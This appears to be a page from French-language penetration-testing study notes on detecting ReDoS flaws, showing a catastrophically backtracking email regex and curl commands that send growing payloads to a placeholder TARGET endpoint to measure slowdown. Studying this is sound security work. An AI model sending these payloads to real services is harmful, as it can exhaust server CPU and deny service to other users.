---
titre: "ReDoS — 1 - Repérage & détection"
tags: [Failles, ReDoS, reconnaissance, timing]
---

# ReDoS — 1. Repérage & détection

> ⬅ [[ReDoS - Index]]

## Où chercher
Tout champ validé par une **regex côté serveur** : email, téléphone, URL, code
postal, mot de passe (politique), pseudo, upload de nom de fichier, search.

## Reconnaître le pattern toxique (si on a la source)
Un `+`/`*` **dans** un groupe lui-même suivi d'un `+`/`*` :
```
/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/
                     └──── (x+)+ imbriqué ────┘
```
`(([a-zA-Z0-9-])+.)+` = `+` interne + `+` externe → ReDoS classique.

## Détection black-box : le signal est le TEMPS
On ne mesure pas un contenu mais un **délai** :
```bash
# input court, valide → instantané
time curl "http://TARGET:3000/api/check-email?email=rien@rien.com"
# input long "presque valide" (se termine par un caractère qui invalide) → lent
time curl "http://TARGET:3000/api/check-email?email=$(python3 -c 'print("a"*30+"@"+"b"*30+".")')"
```
Résultat typique observé :
```
rien@rien.com   → 0.4s    success:true
payload long    → 16.5s   success:false     (~38x plus lent)
```
> 🔑 Le caractère final qui **invalide** l'input force le moteur à explorer **tous**
> les découpages avant de conclure « pas de match » → `success:false` = c'est
> **quand le match échoue** que le backtracking part en vrille.
> 🔑 Le CPU **serveur** brûle ; curl côté client reste à ~0 % (il attend juste).

## Confirmer la corrélation longueur → temps
Augmenter progressivement la longueur : si le temps croît (idéalement de façon
**exponentielle**), c'est un ReDoS.
```bash
for n in 10 20 25 30 32; do
  time curl -s -m 60 "http://TARGET:3000/api/check-email?email=$(python3 -c "print('a'*$n+'@'+'b'*$n+'.')")" >/dev/null
done
```
> ⚠️ `-m 60` (timeout) pour ne pas rester bloqué. **Ne pas** enchaîner pour DoS réel.
> Construction du pire input : [[2 - Exploitation & patterns (ReDoS)]].
